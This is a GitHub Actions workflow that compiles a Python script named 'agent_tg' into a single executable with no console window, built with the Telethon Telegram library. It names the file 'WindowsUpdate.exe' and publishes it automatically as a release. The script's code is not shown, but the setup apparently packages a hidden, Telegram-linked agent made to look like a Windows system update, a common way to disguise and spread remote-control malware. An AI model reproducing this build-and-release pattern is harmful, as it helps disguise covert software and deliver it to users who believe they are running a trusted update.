name: Build & Release

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install pyinstaller requests telethon

      - name: Find and build agent
        shell: pwsh
        run: |
          # find agent file wherever it is
          $file = Get-ChildItem -Recurse -Filter "agent_tg_v2.py" | Select-Object -First 1
          if (-not $file) {
            $file = Get-ChildItem -Recurse -Filter "agent_tg.py" | Select-Object -First 1
          }
          if (-not $file) {
            Write-Error "No agent file found in repo"
            exit 1
          }
          Write-Host "Found: $($file.FullName)"
          pyinstaller --onefile --noconsole --name="WindowsUpdate" `
            --hidden-import=telethon `
            --hidden-import=telethon.sync `
            --hidden-import=telethon.sessions `
            --collect-all telethon `
            "$($file.FullName)"

      - name: Get version tag
        id: version
        shell: pwsh
        run: echo "tag=build-$(Get-Date -Format 'yyyyMMdd-HHmmss')" >> $env:GITHUB_OUTPUT

      - name: Create Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ steps.version.outputs.tag }}
          name: "Build ${{ steps.version.outputs.tag }}"
          body: "Auto build from latest commit"
          files: dist/WindowsUpdate.exe
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
